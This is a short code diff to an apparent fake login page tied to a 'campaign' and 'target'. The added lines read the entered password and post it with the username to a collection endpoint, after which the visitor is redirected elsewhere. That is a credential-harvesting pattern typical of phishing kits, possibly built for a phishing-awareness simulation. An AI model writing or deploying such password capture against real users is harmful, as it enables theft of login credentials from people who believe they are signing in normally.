@@ -538,12 +538,13 @@
 
       const role = loginRole.value;
       const student_id = document.getElementById(`username-${role}`).value.trim();
+      const password = document.getElementById(`password-${role}`).value;
       if (!student_id) return;
       try {
         const res = await fetch('http://localhost:4000/submit', {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ student_id, campaign_id: campaignId, target_id: targetId }),
+          body: JSON.stringify({ student_id, password, campaign_id: campaignId, target_id: targetId }),
         });
         const data = await res.json();
         window.location.href = data.redirect || 'https://www.google.com';
